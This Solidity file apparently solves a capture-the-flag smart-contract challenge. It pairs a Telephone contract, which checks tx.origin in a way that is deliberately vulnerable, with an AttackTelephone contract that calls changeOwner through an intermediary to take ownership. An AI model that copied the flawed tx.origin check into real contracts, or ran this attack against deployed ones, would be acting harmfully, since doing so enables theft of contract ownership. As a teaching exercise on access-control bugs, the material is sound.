// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract AttackTelephone {
    Telephone telephone;

    constructor(address addr) public {
        telephone = Telephone(addr);
    }

    function Attack() public {
        telephone.changeOwner(msg.sender);
    }
}
